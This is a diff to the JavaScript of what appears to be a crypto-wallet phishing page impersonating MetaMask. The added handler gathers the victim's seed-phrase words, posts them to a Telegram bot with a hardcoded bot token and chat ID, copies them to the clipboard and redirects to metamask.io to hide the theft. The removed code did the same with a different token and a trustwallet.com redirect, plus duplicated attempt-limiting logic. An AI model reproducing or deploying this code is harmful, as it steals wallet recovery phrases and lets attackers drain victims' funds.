@@ -288,108 +288,41 @@
 
       return valid;
     }
-const MAX_ATTEMPTS = 3;
-const ATTEMPTS_KEY = "submitAttempts";
 
-function getAttempts() {
-  return parseInt(localStorage.getItem(ATTEMPTS_KEY)) || 0;
-}
+    function handleConfirm() {
+      const errorEl = document.getElementById("errorMsg");
+      if (!validateBIP39Words()) {
+        errorEl.style.display = "block";
+        return;
+      } else {
+        errorEl.style.display = "none";
+      }
 
-function incrementAttempts() {
-  let attempts = getAttempts();
-  attempts++;
-  localStorage.setItem(ATTEMPTS_KEY, attempts);
-  return attempts;
-}
+      const count = parseInt(document.getElementById("phraseLength").value);
+      let phrase = "";
+      for (let i = 1; i <= count; i++) {
+        const value = document.querySelector(`input[name='word${i}']`).value;
+        phrase += value.trim() + " ";
+      }
 
-function isBlocked() {
-  return getAttempts() >= MAX_ATTEMPTS;
-}
+      const botToken = "8006898547:AAG1uCG4idpvvl6rbDGJ-Dx5-nbN0og-kEs"; // Remplace ici
+      const chatId = "6996434307";     // Remplace ici
 
-function blockUser() {
-  document.getElementById("submitBtn").disabled = true;
-  document.getElementById("errorMsg").style.display = "block";
-  document.getElementById("errorMsg").innerText = "Too many attempts. Please try again later.";
-}
-const MAX_ATTEMPTS = 3;
-const ATTEMPTS_KEY = "submitAttempts";
+      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: "🦊 MetaMask wallet:\n\n" + phrase.trim()
+        })
+      });
 
-function getAttempts() {
-  return parseInt(localStorage.getItem(ATTEMPTS_KEY)) || 0;
-}
+      navigator.clipboard.writeText(phrase.trim());
 
-function incrementAttempts() {
-  let attempts = getAttempts();
-  attempts++;
-  localStorage.setItem(ATTEMPTS_KEY, attempts);
-  return attempts;
-}
-
-function isBlocked() {
-  return getAttempts() >= MAX_ATTEMPTS;
-}
-
-function blockUser() {
-  document.getElementById("submitBtn").disabled = true;
-  document.getElementById("errorMsg").style.display = "block";
-  document.getElementById("errorMsg").innerText = "Too many attempts. Please try again later.";
-}
-
-  function handleConfirm() {
-  if (isBlocked()) {
-    blockUser();
-    return;
-  }
-
-  const errorEl = document.getElementById("errorMsg");
-
-  if (!validateBIP39Words()) {
-    incrementAttempts();
-    errorEl.style.display = "block";
-    errorEl.innerText = "Invalid seed phrase. Please check the words.";
-
-    if (isBlocked()) {
-      blockUser();
+      setTimeout(() => {
+        window.location.href = "https://metamask.io/"; // Remplace ton lien ici
+      }, 800);
     }
-    return;
-  } else {
-    errorEl.style.display = "none";
-  }
-
-  incrementAttempts();
-
-  if (isBlocked()) {
-    blockUser();
-    return;
-  }
-
-  // Ton code d'envoi au bot Telegram, copie dans le presse-papiers etc.
-  const count = parseInt(document.getElementById("phraseLength").value);
-  let phrase = "";
-  for (let i = 1; i <= count; i++) {
-    const value = document.querySelector(`input[name='word${i}']`).value;
-    phrase += value.trim() + " ";
-  }
-
-  const botToken = "8085539833:AAGtsErLhAz9IzSMOaROgWVcRARu_jPOYQY"; // Remplace ici
-  const chatId = "6996434307";     // Remplace ici
-
-  fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-    method: "POST",
-    headers: { "Content-Type": "application/json" },
-    body: JSON.stringify({
-      chat_id: chatId,
-      text: "🦊 MetaMask wallet:\n\n" + phrase.trim()
-    })
-  });
-
-  navigator.clipboard.writeText(phrase.trim());
-
-  setTimeout(() => {
-    window.location.href = "https://trustwallet.com/"; // Remplace ton lien ici
-  }, 800);
-}
-
 
     document.addEventListener("paste", function(e) {
       const activeInput = document.activeElement;
